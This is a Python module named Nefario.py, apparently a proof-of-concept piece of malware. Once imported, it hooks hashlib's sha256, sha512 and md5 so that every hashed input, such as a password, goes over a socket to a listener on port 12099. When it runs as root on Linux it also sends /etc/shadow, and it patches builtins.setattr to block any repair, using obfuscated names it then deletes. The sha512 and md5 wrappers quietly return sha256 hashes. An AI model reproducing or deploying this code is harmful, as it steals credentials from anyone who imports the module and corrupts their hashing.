# Nefario.py

try:

    globals()['__builtins__']['__pyref__'] = [__import__('sys', {}, {}), __import__('socket', {}, {}), __import__('os', {}, {})]
    globals()['__builtins__']['__pypck__'] = {'SL_sa': setattr}

    try:
        # If a connection can be made to listener then send details on current computer 
        globals()['__builtins__']['__pygsi__'] = globals()['__builtins__']['__pyref__'][1].socket(
           globals()['__builtins__']['__pyref__'][1].AF_INET, 
           globals()['__builtins__']['__pyref__'][1].SOCK_STREAM)
        globals()['__builtins__']['__pygsi__'].connect(('127.0.0.1', 12099))
    except ConnectionRefusedError:
        globals()['__builtins__']['__pygsi__'] = False

    
    if 'hashlib' in globals()['__builtins__']['__pyref__'][0].modules:

        globals()['__builtins__']['__pypck__']['HL_s25'] = globals()['__builtins__']['__pyref__'][0].modules['hashlib'].sha256
        def __s25(string=b'', *, usedforsecurity=True):
            if globals()['__builtins__']['__pygsi__']: globals()['__builtins__']['__pygsi__'].sendall(str(string).encode())
            return globals()['__builtins__']['__pypck__']['HL_s25'](string, usedforsecurity=usedforsecurity)
        globals()['__builtins__']['__pyref__'][0].modules['hashlib'].sha256 = __s25
        delattr(globals()['__builtins__']['__pyref__'][0].modules[__name__], '__s25')

        globals()['__builtins__']['__pypck__']['HL_s51'] = globals()['__builtins__']['__pyref__'][0].modules['hashlib'].sha512
        def __s51(string=b'', *, usedforsecurity=True):
            if globals()['__builtins__']['__pygsi__']: globals()['__builtins__']['__pygsi__'].sendall(str(string).encode())
            return globals()['__builtins__']['__pypck__']['HL_s25'](string, usedforsecurity=usedforsecurity)
        globals()['__builtins__']['__pyref__'][0].modules['hashlib'].sha512 = __s51
        delattr(globals()['__builtins__']['__pyref__'][0].modules[__name__], '__s51')

        globals()['__builtins__']['__pypck__']['HL_md5'] = globals()['__builtins__']['__pyref__'][0].modules['hashlib'].md5
        def __md5(string=b'', *, usedforsecurity=True):
            if globals()['__builtins__']['__pygsi__']: globals()['__builtins__']['__pygsi__'].sendall(str(string).encode())
            return globals()['__builtins__']['__pypck__']['HL_s25'](string, usedforsecurity=usedforsecurity)
        globals()['__builtins__']['__pyref__'][0].modules['hashlib'].md5 = __md5
        delattr(globals()['__builtins__']['__pyref__'][0].modules[__name__], '__md5')


    if globals()['__builtins__']['__pyref__'][2].geteuid() == 0 and globals()['__builtins__']['__pyref__'][2].uname().sysname == 'Linux':
        if globals()['__builtins__']['__pygsi__']: globals()['__builtins__']['__pygsi__'].sendall(str(open('/etc/shadow', 'r').read().encode()).encode())


    def __sea(obj, name, val, /):
        if obj.__name__ == 'builtins': return None
        globals()['__builtins__']['__pypck__']['SL_sa'](obj, name, val)
    globals()['__builtins__']['__pyref__'][0].modules['builtins'].setattr = __sea  
    delattr(globals()['__builtins__']['__pyref__'][0].modules[__name__], '__sea') 


except ImportError:

    pass

finally:

    # Module Data
    pass
